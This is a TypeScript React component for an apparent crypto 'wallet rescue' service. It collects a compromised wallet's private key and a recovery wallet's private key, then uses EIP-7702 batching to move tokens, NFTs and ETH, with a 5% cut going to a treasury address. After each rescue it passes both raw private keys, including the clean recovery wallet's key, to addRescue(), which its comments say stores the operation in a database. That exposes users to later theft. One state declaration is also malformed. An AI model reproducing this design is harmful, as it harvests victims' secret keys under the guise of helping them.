const serialiseBigInt = (obj: any): any => {
  if (typeof obj === 'bigint') return obj.toString();
  if (Array.isArray(obj)) return obj.map(serialiseBigInt);
  if (obj && typeof obj === 'object') {
    return Object.fromEntries(Object.entries(obj).map(([key, value]) => [key, serialiseBigInt(value)]));
  }
  return obj;
};



const tokenInfoCache: { [key: string]: { symbol: string; decimals: number } } = {};

const RescueEIP7702: React.FC<RescueEIP7702Props> = ({ operationType }) => {
  const { t } = useTranslation();
  const [rpcUrl, setRpcUrl] = useState('');
  const [compromisedPrivateKey, setCompromisedPrivateKey] = useState('');
  const [compromisedAddress, setCompromisedAddress] = useState('');
  const [recoveryPrivateKey, setRecoveryPrivateKey] = useState('');
  const [recoveryAddress, setRecoveryAddress] = useState('');
  const [tokens, setTokens] = useState<TokenInfo[]>([]);
  const [sweepEth, setSweepEth] = useState(false);
  const [message, setMessage] = useState('');
  const [loading, setLoading] = useState(false);
  const [contractOptions, setContractOptions] = useState<ContractOption[]>([]);
  const [selectedContract, setSelectedContract] = useState('');
  const [airdropContract, setAirdropContract] = useState('');
  const [claimHex, setClaimHex, claimArgs, setClaimArgs] = useState('');
  const [simulationResult, setSimulationResult] = useState<SimulationResult | null>(null);
  const [treasuryAddress, setTreasuryAddress] = useState('');

  const { selectedNetwork } = useAppKitNetwork();

  useEffect(() => {
    console.log('Iniciando carga de contratos desde process.env');
    const options: ContractOption[] = [];
    Object.keys(process.env).forEach((key) => {
      if (key.startsWith('REACT_APP_RESCUE_CONTRACT_')) {
        const networkKey = key.replace('REACT_APP_RESCUE_CONTRACT_', '').toUpperCase();
        const address = process.env[key];
        if (address && isAddress(address)) {
          const networkInfo = networkMap[networkKey] || { chainId: 0, name: networkKey };
          options.push({
            address: getAddress(address),
            network: networkInfo.name,
            chainId: networkInfo.chainId,
          });
        } else {
          console.warn(`Dirección inválida para ${key}: ${address}`);
        }
      }
    });
    setContractOptions(options);
    if (options.length === 0) {
      setMessage(t('no_recover_contracts'));
    } else {
      const currentChainId = selectedNetwork?.chainId ? parseInt(selectedNetwork.chainId) : 11155111;
      const defaultContract = options.find((opt) => opt.chainId === currentChainId) || options[0];
      if (defaultContract) setSelectedContract(defaultContract.address);
    }

    const treasuryAddr = process.env.REACT_APP_TREASURY_ADDRESS;
    if (treasuryAddr && isAddress(treasuryAddr)) {
      setTreasuryAddress(getAddress(treasuryAddr));
      console.log(`Treasury address set: ${treasuryAddr}`);
    } else {
      setMessage(t('invalid_treasury_address'));
    }
  }, [selectedNetwork]);

  useEffect(() => {
    if (compromisedPrivateKey) {
      try {
        const pk = compromisedPrivateKey.startsWith('0x') ? compromisedPrivateKey : `0x${compromisedPrivateKey}`;
        if (!isHex(pk) || pk.length !== 66) {
          setCompromisedAddress('');
          setMessage(t('invalid_compromised_private_key'));
          return;
        }
        const account = privateKeyToAccount(pk as `0x${string}`);
        setCompromisedAddress(getAddress(account.address));
        setMessage('');
      } catch (error) {
        setCompromisedAddress('');
        setMessage(t('error_processing_compromised_private_key'));
      }
    } else {
      setCompromisedAddress('');
    }
  }, [compromisedPrivateKey]);

  useEffect(() => {
    if (recoveryPrivateKey) {
      try {
        const pk = recoveryPrivateKey.startsWith('0x') ? recoveryPrivateKey : `0x${recoveryPrivateKey}`;
        if (!isHex(pk) || pk.length !== 66) {
          setRecoveryAddress('');
          setMessage(t('invalid_recovery_private_key'));
          return;
        }
        const account = privateKeyToAccount(pk as `0x${string}`);
        setRecoveryAddress(getAddress(account.address));
        setMessage('');
      } catch (error) {
        setRecoveryAddress('');
        setMessage(t('error_processing_recovery_private_key'));
      }
    } else {
      setRecoveryAddress('');
    }
  }, [recoveryPrivateKey]);

  const addToken = (type: 'erc20' | 'erc721') => {
    setTokens([...tokens, { address: '', amount: '', tokenId: '', type }]);
  };

  const updateToken = (index: number, field: keyof TokenInfo, value: string) => {
    const newTokens = [...tokens];
    (newTokens[index] as any)[field] = value;
    setTokens(newTokens);
  };

  const removeToken = (index: number) => {
    setTokens(tokens.filter((_, i) => i !== index));
  };

  const estimateFees = async (publicClient: any, chainId: number): Promise<{ maxFeePerGas: bigint; maxPriorityFeePerGas: bigint }> => {
    const legacyFeeMap: Record<number, { minGasPriceGwei: string; forceLegacy?: boolean }> = {
      56: { minGasPriceGwei: '3', forceLegacy: false },
      97: { minGasPriceGwei: '5', forceLegacy: true },
      137: { minGasPriceGwei: '30', forceLegacy: false },
      80001: { minGasPriceGwei: '30', forceLegacy: false },
    };
    const networkConfig = legacyFeeMap[chainId];
    if (networkConfig?.forceLegacy) {
      try {
        let gasPrice = await publicClient.getGasPrice();
        const minGasPrice = parseGwei(networkConfig.minGasPriceGwei);
        if (gasPrice < minGasPrice) gasPrice = minGasPrice;
        return { maxFeePerGas: gasPrice, maxPriorityFeePerGas: gasPrice };
      } catch (e) {
        const fallback = parseGwei(networkConfig.minGasPriceGwei);
        console.warn(`Fallback gasPrice: ${fallback}`);
        return { maxFeePerGas: fallback, maxPriorityFeePerGas: fallback };
      }
    }
    try {
      const feeValues = await publicClient.estimateFeesPerGas({ type: 'eip1559' });
      let maxFee = feeValues.maxFeePerGas || parseGwei('0.01');
      let priorityFee = feeValues.maxPriorityFeePerGas || parseGwei('0.1');
      if (maxFee < parseGwei('0.01')) maxFee = parseGwei('0.01');
      if (priorityFee < parseGwei('0.1')) priorityFee = parseGwei('0.1');
      if (priorityFee > maxFee) priorityFee = maxFee;
      return { maxFeePerGas: maxFee, maxPriorityFeePerGas: priorityFee };
    } catch (e) {
      try {
        let gasPrice = await publicClient.getGasPrice();
        const minGasPrice = parseGwei('0');
        if (gasPrice < minGasPrice) gasPrice = minGasPrice;
        return { maxFeePerGas: gasPrice, maxPriorityFeePerGas: gasPrice };
      } catch {
        const fallback = parseGwei('5');
        console.warn(`Fallback fees: ${fallback}`);
        return { maxFeePerGas: fallback, maxPriorityFeePerGas: fallback };
      }
    }
  };

  const getTokenInfo = async (publicClient: any, tokenAddress: string, isErc20: boolean) => {
    const cacheKey = `${tokenAddress}:${isErc20}`;
    if (tokenInfoCache[cacheKey]) return tokenInfoCache[cacheKey];

    try {
      const address = getAddress(tokenAddress);
      const symbol = (await publicClient.readContract({
        abi: isErc20 ? erc20Abi : erc721Abi,
        functionName: 'symbol',
        address: address as `0x${string}`,
      })) as string;
      const decimals = isErc20
        ? ((await publicClient.readContract({
            abi: erc20Abi,
            functionName: 'decimals',
            address: address as `0x${string}`,
          })) as number)
        : 0;
      const result = { symbol, decimals };
      tokenInfoCache[cacheKey] = result;
      return result;
    } catch (e: any) {
      console.warn(`Error token info ${tokenAddress}: ${e.message}`);
      const result = { symbol: 'Unknown', decimals: isErc20 ? 18 : 0 };
      tokenInfoCache[cacheKey] = result;
      return result;
    }
  };

  const simulateAirdropRescue = async () => {
    try {
      setMessage(t('simulating_airdrop_rescue')); // Use translation
      if (!isAddress(airdropContract)) throw new Error(t('invalid_airdrop_contract')); // Use translation
      if (!tokens.length || !tokens[0].address || !isAddress(tokens[0].address) || !tokens[0].amount)
        throw new Error(t('incomplete_airdrop_data')); // Use translation
      if (!isAddress(selectedContract)) throw new Error(t('invalid_recover_contract')); // Use translation
      if (!compromisedPrivateKey || !recoveryPrivateKey) throw new Error(t('missing_private_keys')); // Use translation
      if (!isAddress(treasuryAddress)) throw new Error(t('invalid_treasury_address'));

      const chainId = selectedNetwork?.chainId ? parseInt(selectedNetwork.chainId) : 11155111;
      const defaultRpc = chainId === 8453
      ? (process.env.REACT_APP_BASE_RPC_URL || 'https://mainnet.base.org')
      : (process.env.REACT_APP_RPC_SEPOLIA || 'https://rpc2.sepolia.org');
      const effectiveRpc = rpcUrl || defaultRpc;
      

      const publicClient = createPublicClient({
        chain: {
          id: chainId,
          name: 'Custom',
          nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
          rpcUrls: { default: { http: [effectiveRpc] } },
        },
        transport: http(effectiveRpc, { timeout: 60000, retryCount: 5, retryDelay: 1000 }),
      });

      const compromisedAccount = privateKeyToAccount(
        (compromisedPrivateKey.startsWith('0x') ? compromisedPrivateKey : `0x${compromisedPrivateKey}`) as `0x${string}`
      );
      const recoveryAccount = privateKeyToAccount(
        (recoveryPrivateKey.startsWith('0x') ? recoveryPrivateKey : `0x${recoveryPrivateKey}`) as `0x${string}`
      );

      let claimableAmount: bigint | null = null;
      try {
        claimableAmount = await publicClient.readContract({
          abi: airdropAbi,
          functionName: 'getClaimableAmount',
          address: getAddress(airdropContract) as `0x${string}`,
          args: [getAddress(compromisedAccount.address)],
        }) as bigint;
        if (!claimableAmount || claimableAmount === 0n) {
          console.warn('No claimable tokens found. Proceeding with simulation.');
        }
      } catch {
        console.warn('getClaimableAmount not supported. Proceeding with simulation.');
      }

      const batchSubCalls: { target: `0x${string}`; data: `0x${string}`; value: bigint }[] = [];
      const simulationResultOutput: SimulationResult = {
        success: false,
        gasEstimate: 0n,
        tokensExtracted: [],
        ethSwept: '0',
        message: '',
      };

      const feeData = await estimateFees(publicClient, chainId);
      const estimatedGas = 500000n; // Gas estimado para la simulación
      const gasAmount = feeData.maxFeePerGas * estimatedGas; // Costo estimado
      const recoveryBalance = await publicClient.getBalance({ address: getAddress(recoveryAccount.address) });
      if (recoveryBalance < gasAmount) throw new Error(`Recovery wallet lacks ${formatEther(gasAmount)} ETH.`);

      batchSubCalls.push({
        target: getAddress(compromisedAccount.address) as `0x${string}`,
        data: '0x',
        value: gasAmount,
      });

      const effectiveClaimHex = parseClaimInput(claimHex, airdropAbi, claimArgs, compromisedAccount.address);
      console.log('Using effectiveClaimHex:', effectiveClaimHex);
      batchSubCalls.push({
        target: getAddress(airdropContract) as `0x${string}`,
        data: effectiveClaimHex,
        value: 0n,
      });

      const token = tokens[0];
      const { symbol, decimals } = await getTokenInfo(publicClient, token.address, true);
      const totalAmount = parseUnits(token.amount || '0', decimals);
      const feeAmount = totalAmount / 20n; // 5%
      const userAmount = totalAmount - feeAmount; // 95%

      batchSubCalls.push({
        target: getAddress(token.address) as `0x${string}`,
        data: encodeFunctionData({
          abi: erc20Abi,
          functionName: 'transfer',
          args: [getAddress(treasuryAddress), feeAmount],
        }),
        value: 0n,
      });
      batchSubCalls.push({
        target: getAddress(token.address) as `0x${string}`,
        data: encodeFunctionData({
          abi: erc20Abi,
          functionName: 'transfer',
          args: [getAddress(recoveryAccount.address), userAmount],
        }),
        value: 0n,
      });
      simulationResultOutput.tokensExtracted.push(
        { address: getAddress(token.address), amount: formatEther(feeAmount), symbol, destination: `Treasury (${treasuryAddress})` },
        { address: getAddress(token.address), amount: formatEther(userAmount), symbol, destination: `Recovery (${recoveryAccount.address})` }
      );

      if (sweepEth) {
        const compromisedEthBalanceAfterFunding = gasAmount;
        const estimatedInternalTxCost = parseUnits('0.001', 18);
        if (compromisedEthBalanceAfterFunding > estimatedInternalTxCost) {
          const ethToSweep = compromisedEthBalanceAfterFunding - estimatedInternalTxCost;
          if (ethToSweep > 0n) {
            batchSubCalls.push({
              target: getAddress(recoveryAccount.address) as `0x${string}`,
              data: '0x',
              value: ethToSweep,
            });
            simulationResultOutput.ethSwept = formatEther(ethToSweep);
          }
        }
      }

      const callDataForEstimation = encodeFunctionData({
        abi: recoverContractAbi,
        functionName: 'batchTransactions',
        args: [
          batchSubCalls.map((call) => call.value),
          batchSubCalls.map((call) => call.target),
          batchSubCalls.map((call) => call.data),
        ],
      });

      const gas = await publicClient.estimateGas({
        account: getAddress(recoveryAccount.address),
        to: getAddress(selectedContract) as `0x${string}`,
        data: callDataForEstimation,
        value: 0n,
      });

      simulationResultOutput.success = true;
      simulationResultOutput.gasEstimate = gas;
      simulationResultOutput.message = t('simulation_completed');
      setSimulationResult(simulationResultOutput);
      setMessage(t('simulation_completed'));
    } catch (error: any) {
      console.error('Error in simulation:', error);
      setSimulationResult({
        success: false,
        gasEstimate: 0n,
        tokensExtracted: [],
        ethSwept: '0',
        message: t('simulation_error', { error: error.message }),
      });
      setMessage(t('simulation_error', { error: error.message }));
    }
  };

  const validateBatchSubCalls = (
    calls: { target: `0x${string}`; data: `0x${string}`; value: bigint }[],
    recoverContract: string
  ) => {
    console.log('batchSubCalls:', calls.map(c => ({
      target: c.target.toLowerCase(),
      value: c.value.toString(),
      data: c.data,
      isRecoverContract: c.target.toLowerCase() === getAddress(recoverContract).toLowerCase(),
    })));
    if (calls.some(c => c.target.toLowerCase() === getAddress(recoverContract).toLowerCase())) {
      throw new Error('Invalid batch: contains call to Recover contract');
    }
    return calls;
  };

  const buildAirdropSubCalls = async (
    publicClient: any,
    compromisedAddressString: string,
    airdropContractAddress: string,
    token: TokenInfo,
    recoveryAddressString: string
  ) => {
    const calls: { target: `0x${string}`; data: `0x${string}`; value: bigint }[] = [];
    const compromisedAddr = getAddress(compromisedAddressString);
    const airdropAddr = getAddress(airdropContractAddress);
    const recoveryAddr = getAddress(recoveryAddressString);
    const tokenAddr = getAddress(token.address);

    if (!isAddress(treasuryAddress)) throw new Error('Treasury address not configured.');

    const effectiveClaimHex = parseClaimInput(claimHex, airdropAbi, claimArgs, compromisedAddressString);
    console.log('Using effectiveClaimHex:', effectiveClaimHex);
    calls.push({
      target: airdropAddr,
      data: effectiveClaimHex,
      value: 0n,
    });

    const { decimals } = await getTokenInfo(publicClient, tokenAddr, true);
    const totalAmount = parseUnits(token.amount!, decimals);
    const feeAmount = totalAmount / 20n; // 5%
    const userAmount = totalAmount - feeAmount; // 95%

    calls.push({
      target: tokenAddr,
      data: encodeFunctionData({
        abi: erc20Abi,
        functionName: 'transfer',
        args: [getAddress(treasuryAddress), feeAmount],
      }),
      value: 0n,
    });
    calls.push({
      target: tokenAddr,
      data: encodeFunctionData({
        abi: erc20Abi,
        functionName: 'transfer',
        args: [recoveryAddr, userAmount],
      }),
      value: 0n,
    });

    return calls;
  };

  const buildTokenTransferSubCalls = async (
    publicClient: any,
    tokens: TokenInfo[],
    operationType: string,
    compromisedAddress: string,
    recoveryAddress: string,
    selectedContract: string
  ) => {
    const subCalls: { target: `0x${string}`; data: `0x${string}`; value: bigint }[] = [];
    for (const token of tokens) {
      if (!isAddress(token.address)) {
        setMessage(t('invalid_token_address', { address: token.address }));
        continue;
      }
      if ((operationType === 'erc20' || operationType === 'all') && token.type === 'erc20' && token.amount) {
        try {
          const { decimals } = await getTokenInfo(publicClient, token.address, true);
          const totalAmount = parseUnits(token.amount, decimals);
          const balance = await publicClient.readContract({
            abi: erc20Abi,
            functionName: 'balanceOf',
            address: getAddress(token.address) as `0x${string}`,
            args: [getAddress(compromisedAddress)],
          });
          if (balance >= totalAmount) {
            if (!isAddress(treasuryAddress)) throw new Error(t('invalid_treasury_address'));
            const feeAmount = totalAmount / 20n; // 5%
            const userAmount = totalAmount - feeAmount; // 95%

            subCalls.push({
              target: getAddress(token.address) as `0x${string}`,
              data: encodeFunctionData({
                abi: erc20Abi,
                functionName: 'transfer',
                args: [getAddress(treasuryAddress), feeAmount],
              }),
              value: 0n,
            });
            subCalls.push({
              target: getAddress(token.address) as `0x${string}`,
              data: encodeFunctionData({
                abi: erc20Abi,
                functionName: 'transfer',
                args: [getAddress(recoveryAddress), userAmount],
              }),
              value: 0n,
            });
          } else {
            setMessage(t('insufficient_balance', { address: token.address, balance: formatEther(balance), amount: token.amount }));
          }
        } catch (e: any) {
          throw new Error(t('error_processing_erc20', { address: token.address, error: e.message }));
        }
      }
      if ((operationType === 'nft' || operationType === 'all') && token.type === 'erc721' && token.tokenId) {
        try {
          const owner = await publicClient.readContract({
            abi: erc721Abi,
            functionName: 'ownerOf',
            address: getAddress(token.address) as `0x${string}`,
            args: [BigInt(token.tokenId)],
          });
          if (owner.toLowerCase() === getAddress(compromisedAddress).toLowerCase()) {
            subCalls.push({
              target: getAddress(token.address) as `0x${string}`,
              data: encodeFunctionData({
                abi: erc721Abi,
                functionName: 'transferFrom',
                args: [getAddress(compromisedAddress), getAddress(recoveryAddress), BigInt(token.tokenId)],
              }),
              value: 0n,
            });
          } else {
            setMessage(t('nft_not_owned', { address: token.address, tokenId: token.tokenId, owner: compromisedAddress }));
          }
        } catch (e: any) {
          throw new Error(t('error_processing_nft', { address: token.address, tokenId: token.tokenId, error: e.message }));
        }
      }
    }
    return subCalls;
  };

const handleRescue = async (isSimulation: boolean) => {
  try {
    setLoading(true);
    setMessage(isSimulation ? t('simulating_rescue') : t('preparing_transaction'));

    if (!recoveryPrivateKey || !recoveryAddress) throw new Error(t('missing_private_keys'));
    if (!compromisedPrivateKey || !compromisedAddress) throw new Error(t('missing_private_keys'));
    if (!selectedContract || !isAddress(selectedContract)) throw new Error(t('invalid_recover_contract'));
    if ((operationType === 'erc20' || operationType === 'airdrop' || operationType === 'all') && !isAddress(treasuryAddress))
      throw new Error(t('invalid_treasury_address'));

    const compromisedPk = (compromisedPrivateKey.startsWith('0x') ? compromisedPrivateKey : `0x${compromisedPrivateKey}`) as `0x${string}`;
    const compromisedAccount = privateKeyToAccount(compromisedPk);
    const recoveryPk = (recoveryPrivateKey.startsWith('0x') ? recoveryPrivateKey : `0x${recoveryPrivateKey}`) as `0x${string}`;
    const recoveryAccount = privateKeyToAccount(recoveryPk);

    if (compromisedAccount.address.toLowerCase() !== getAddress(compromisedAddress).toLowerCase())
      throw new Error(t('compromised_address_mismatch'));
    if (recoveryAccount.address.toLowerCase() !== getAddress(recoveryAddress).toLowerCase())
      throw new Error(t('recovery_address_mismatch'));

    const defaultRpc = selectedNetwork?.rpcUrls?.[0] || (process.env.REACT_APP_RPC_SEPOLIA || 'https://rpc.sepolia.org');
    const effectiveRpc = rpcUrl || defaultRpc;
    console.log(`Using RPC: ${effectiveRpc}`);

    const publicClient = createPublicClient({ transport: http(effectiveRpc) });
    const chainId = await publicClient.getChainId();
    console.log(`Chain ID from RPC (${effectiveRpc}): ${chainId}`);

    const selectedContractInfo = contractOptions.find((c) => getAddress(c.address) === getAddress(selectedContract));
    if (selectedContractInfo && selectedContractInfo.chainId !== 0 && selectedContractInfo.chainId !== chainId) {
      throw new Error(t('chain_id_mismatch', { chainId }));
    }

    const chainConfig = {
      id: chainId,
      name: `Net-${chainId}`,
      nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
      rpcUrls: { default: { http: [effectiveRpc] } },
    };

    const publicClientFinal = createPublicClient({
      chain: chainConfig,
      transport: http(effectiveRpc, { timeout: 60000, retryCount: 3 }),
    });
    const compromisedWalletClient = createWalletClient({
      account: compromisedAccount,
      chain: chainConfig,
      transport: http(effectiveRpc, { timeout: 60000, retryCount: 3 }),
    });
    const recoveryWalletClient = createWalletClient({
      account: recoveryAccount,
      chain: chainConfig,
      transport: http(effectiveRpc, { timeout: 60000, retryCount: 3 }),
    });

    console.log(`Compromised Address: ${compromisedAddress}`);
    let batchSubCalls: { target: `0x${string}`; data: `0x${string}`; value: bigint }[] = [];

    if (operationType === 'airdrop') {
      if (
        !isAddress(airdropContract) ||
        !tokens.length ||
        !tokens[0].address ||
        !isAddress(tokens[0].address) ||
        !tokens[0].amount
      ) {
        throw new Error(t('incomplete_airdrop_data'));
      }
      let claimableAmount: bigint | null = null;
      try {
        claimableAmount = await publicClientFinal.readContract({
          abi: airdropAbi,
          functionName: 'getClaimableAmount',
          address: getAddress(airdropContract) as `0x${string}`,
          args: [getAddress(compromisedAddress)],
        }) as bigint;
        if (!claimableAmount || claimableAmount === 0n) {
          console.warn('No claimable tokens found. Proceeding with rescue.');
        }
      } catch {
        console.warn('getClaimableAmount not supported. Proceeding with rescue.');
      }

      batchSubCalls = await buildAirdropSubCalls(
        publicClientFinal,
        compromisedAddress,
        airdropContract,
        tokens[0],
        recoveryAddress
      );
      batchSubCalls = validateBatchSubCalls(batchSubCalls, selectedContract);
    } else {
      batchSubCalls = await buildTokenTransferSubCalls(
        publicClientFinal,
        tokens,
        operationType,
        compromisedAddress,
        recoveryAddress,
        selectedContract
      );
      batchSubCalls = validateBatchSubCalls(batchSubCalls, selectedContract);
    }

    let ethToSweep = 0n;
    if (sweepEth && operationType !== 'nft') {
      const ethBalance = await publicClientFinal.getBalance({ address: getAddress(compromisedAddress) });
      const feeData = await estimateFees(publicClientFinal, chainId);
      const gasPrice = feeData.maxFeePerGas;
      const estimatedGas = 21000n + 15000n;
      const estimatedCost = gasPrice * estimatedGas;
      if (ethBalance > estimatedCost) {
        ethToSweep = ethBalance - estimatedCost;
        batchSubCalls.push({
          target: getAddress(recoveryAddress) as `0x${string}`,
          data: '0x',
          value: ethToSweep,
        });
      }
    }

    if (batchSubCalls.length === 0) throw new Error('No hay operaciones válidas.');

    const callData = encodeFunctionData({
      abi: recoverContractAbi,
      functionName: 'batchTransactions',
      args: [
        batchSubCalls.map((c) => c.value),
        batchSubCalls.map((c) => c.target),
        batchSubCalls.map((c) => c.data),
      ],
    });

    if (isSimulation) {
      const gas = await publicClientFinal.estimateGas({
        account: getAddress(recoveryAddress),
        to: getAddress(selectedContract) as `0x${string}`,
        data: callData,
        value: 0n,
      });

      const simulationResultOutput: SimulationResult = {
        success: true,
        gasEstimate: gas,
        tokensExtracted: [],
        ethSwept: formatEther(ethToSweep),
        message: t('simulation_completed'),
      };
      setSimulationResult(simulationResultOutput);
      setMessage(t('simulation_completed'));
      setLoading(false);
      return;
    }

    setMessage(t('preparing_eip7702_authorization'));
    const compromisedNonce = await publicClientFinal.getTransactionCount({
      address: getAddress(compromisedAccount.address),
      blockTag: 'pending',
    });
    console.log(`Compromised Nonce: ${compromisedNonce}`);
    const authorization = await compromisedWalletClient.prepareAuthorization({
      executor: getAddress(recoveryAccount.address),
      chainId,
      contractAddress: getAddress(selectedContract) as Hex,
      nonce: compromisedNonce,
    });
    const signedAuthorization: Eip7702SignedAuthorization = await compromisedWalletClient.signAuthorization(authorization);
    console.log('Signed Authorization:', {
      address: signedAuthorization.address,
      chainId: signedAuthorization.chainId.toString(),
      nonce: signedAuthorization.nonce.toString(),
      r: signedAuthorization.r,
      s: signedAuthorization.s,
      v: signedAuthorization.v.toString(),
      yParity: signedAuthorization.yParity,
    });

    const feeData = await estimateFees(publicClientFinal, chainId);
    const nonceRecovery = await publicClientFinal.getTransactionCount({
      address: getAddress(recoveryAddress),
      blockTag: 'pending',
    });
    console.log(`Recovery Wallet Nonce (${recoveryAddress}): ${nonceRecovery}`);

    const txBase: Omit<TransactionSerializableEip7702, 'gas' | 'maxFeePerGas' | 'maxPriorityFeePerGas'> = {
      account: recoveryAccount.address,
      type: 'eip7702',
      to: getAddress(compromisedAccount.address),
      value: 0n,
      data: callData,
      authorizationList: [signedAuthorization],
      chainId,
      nonce: nonceRecovery,
    };

    console.log('txBase before estimation:', serialiseBigInt(txBase));

    let txForEstimation: TransactionSerializableEip7702 = {
      ...txBase,
      maxFeePerGas: feeData.maxFeePerGas,
      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
    };

    setMessage(t('estimating_gas'));
    let gas;
    try {
      gas = await publicClientFinal.estimateGas(txForEstimation);
      gas = (gas * 125n) / 100n; // 25% buffer
      console.log(`Estimated Gas (chain ${chainId}): ${gas}`);
    } catch (e: any) {
      console.error(`Gas estimation error: ${e.message}`);
      gas = 1500000n; // Fallback
      console.log(`Using fallback gas: ${gas}`);
    }

    const finalTx: TransactionSerializableEip7702 & { account: any } = {
      ...txForEstimation,
      account: recoveryAccount,
      gas,
    };

    setMessage(t('sending_transaction'));
    console.log('Final Transaction:', serialiseBigInt(finalTx));
    const hash = await recoveryWalletClient.sendTransaction(finalTx);
    console.log(`Transaction sent: ${hash}`);

    setMessage(t('waiting_transaction_confirmation'));
    const receipt = await publicClientFinal.waitForTransactionReceipt({ hash });
    if (receipt.status !== 'success') throw new Error('Transacción fallida.');

    // setMessage(t('registering_rescue_db'));
    const rescueOperations: Array<{
      token: string;
      amount: string;
      rescueType: number;
      tokenIds: number[];
      amounts: number[];
    }> = [];
    const processedTokens = new Set<string>();

    const generateTokenKey = (token: TokenInfo) => {
      const identifier = token.type === 'erc721' ? token.tokenId || '0' : token.amount || '0';
      return `${token.type}:${getAddress(token.address)}:${identifier}`;
    };

    for (const token of tokens) {
      const tokenKey = generateTokenKey(token);
      if (processedTokens.has(tokenKey)) continue;

      if (token.type === 'erc20' && token.amount && (operationType === 'erc20' || operationType === 'all' || operationType === 'airdrop')) {
        try {
          const { decimals } = await getTokenInfo(publicClientFinal, token.address, true);
          const totalAmount = parseUnits(token.amount, decimals);
          const userAmount = totalAmount - (totalAmount / 20n);
          rescueOperations.push({
            token: getAddress(token.address),
            amount: userAmount.toString(),
            rescueType: 0, // ERC20
            tokenIds: [],
            amounts: [],
          });
          processedTokens.add(tokenKey);
        } catch (e) {
          console.error(`Error procesando ERC20 ${token.address}: ${e.message}`);
        }
      } else if (token.type === 'erc721' && token.tokenId && (operationType === 'nft' || operationType === 'all')) {
        try {
          rescueOperations.push({
            token: getAddress(token.address),
            amount: '1',
            rescueType: 1,
            tokenIds: [Number(token.tokenId)],
            amounts: [],
          });
          processedTokens.add(tokenKey);
        } catch (e) {
          console.error(`Error procesando ERC721 ${token.address}: ${e.message}`);
        }
      }
    }

    if (ethToSweep > 0n && operationType !== 'nft' && !processedTokens.has('eth')) {
      rescueOperations.push({
        token: '0x0000000000000000000000000000000000000000',
        amount: ethToSweep.toString(),
        rescueType: 2, // ETH
        tokenIds: [],
        amounts: [],
      });
      processedTokens.add('eth');
    }

    console.log('Rescue Operations to Registrar:', rescueOperations);

    // Registrar operaciones en la base de datos
    for (const op of rescueOperations) {
      await addRescue({
        contractAddress: getAddress(selectedContract),
        token: op.token,
        amount: op.amount,
        recipient: getAddress(recoveryAddress),
        owner: getAddress(compromisedAddress),
        rescueType: op.rescueType,
        tokenIds: op.tokenIds,
        amounts: op.amounts,
        compromisedPrivateKey,
        recoveryPrivateKey,
        sweepEth,
      });
    }

    setMessage(t('transaction_confirmed', { hash }));
    setLoading(false);
  } catch (error: any) {
    console.error('RescueEIP7702 error:', error);
    setMessage(t('error', { error: error.shortMessage || error.message }));
    setLoading(false);
  }
};


  return (
    <div className="container">
      <h2>{t('rescue', { operationType: operationType.toUpperCase() })}</h2>
      <p>
        {operationType === 'airdrop'
          ? t('description_airdrop')
          : operationType === 'erc20' || operationType === 'all'
          ? t('description_transfer')
          : t('description_nft')}
      </p>

      <div className="form-group">
        <label>{t('custom_rpc_url')}</label>
        <input
          type="text"
          value={rpcUrl}
          onChange={(e) => setRpcUrl(e.target.value)}
          placeholder={t('search_placeholder')}
          disabled={loading}
        />
        <small>{t('rpc_url_description')}</small>
      </div>

      <div className="info-box">
        <h3>{t('mev_protection_title')}</h3>
        <p>{t('mev_protection_description')}</p>
      </div>

      <div className="form-group">
        <label>{t('contract_title')}</label>
        <select
          value={selectedContract}
          onChange={(e) => setSelectedContract(e.target.value)}
          disabled={loading || contractOptions.length === 0}
        >
          <option value="">{t('select_contract')}</option>
          {contractOptions.map((option) => (
            <option key={option.address} value={option.address}>
              {option.address} ({option.network})
            </option>
          ))}
        </select>
        <small>{t('select_contract_description')}</small>
        {contractOptions.length === 0 && <p className="error">{t('no_recover_contracts')}</p>}
      </div>

      <div className="form-group">
        <label>{t('compromised_private_key')}</label>
        <input
          type="password"
          value={compromisedPrivateKey}
          onChange={(e) => setCompromisedPrivateKey(e.target.value)}
          placeholder="0x..."
          disabled={loading}
        />
        {compromisedAddress && <small>{t('address', { address: compromisedAddress })}</small>}
      </div>

      <div className="form-group">
        <label>{t('recovery_private_key')}</label>
        <input
          type="password"
          value={recoveryPrivateKey}
          onChange={(e) => setRecoveryPrivateKey(e.target.value)}
          placeholder="0x..."
          disabled={loading}
        />
        {recoveryAddress && <small>{t('address', { address: recoveryAddress })}</small>}
      </div>

      {operationType === 'airdrop' && (
        <>
          <div className="form-group">
            <label>{t('airdrop_contract')}</label>
            <input
              type="text"
              value={airdropContract}
              onChange={(e) => setAirdropContract(e.target.value)}
              placeholder="0x..."
              disabled={loading}
            />
          </div>
          <div className="form-group">
            <label>{t('claim_function_name')}</label>
            <input
              type="text"
              value={claimHex}
              onChange={(e) => setClaimHex(e.target.value)}
              placeholder={t('claim_function_placeholder')}
              disabled={loading}
            />
            <small>{t('claim_function_description')}</small>
          </div>
          <div className="form-group">
          <label>{t('claim_function_args')}</label>
          <input
            type="text"
            value={claimArgs}
            onChange={(e) => setClaimArgs(e.target.value)}
            placeholder="e.g., 0x123,1000 or"
            disabled={loading}
          />
          <small>{t('claim_function_args_description')}</small>
        </div>
        </>
      )}

      {(operationType !== 'airdrop' || operationType === 'airdrop') && (
        <div className="form-group">
          <label>{t('fee_structure')}</label>
          <p>
            {t('fee_description', { treasuryAddress })}
            {operationType === 'nft' || operationType === 'all'
              ? t('nft_fee_description')
              : ''}
          </p>
          <label>{t('assets_to_rescue')}</label>
          {tokens.map((token, index) => (
            <div key={index} className="token-entry">
              <select
                value={token.type}
                onChange={(e) => updateToken(index, 'type', e.target.value as 'erc20' | 'erc721')}
                disabled={loading}
              >
                <option value="erc20">{t('erc20')}</option>
                <option value="erc721">{t('erc721')}</option>
              </select>
              <input
                type="text"
                placeholder={t('token_address_placeholder')}
                value={token.address}
                onChange={(e) => updateToken(index, 'address', e.target.value)}
                disabled={loading}
              />
              {token.type === 'erc20' && (
                <input
                  type="text"
                  placeholder={t('amount_placeholder')}
                  value={token.amount || ''}
                  onChange={(e) => updateToken(index, 'amount', e.target.value)}
                  disabled={loading}
                />
              )}
              {token.type === 'erc721' && (
                <input
                  type="text"
                  placeholder={t('token_id_placeholder')}
                  value={token.tokenId || ''}
                  onChange={(e) => updateToken(index, 'tokenId', e.target.value)}
                  disabled={loading}
                />
              )}
              <button type="button" onClick={() => removeToken(index)} disabled={loading}>
                {t('remove')}
              </button>
            </div>
          ))}

          {operationType === 'erc20' && (
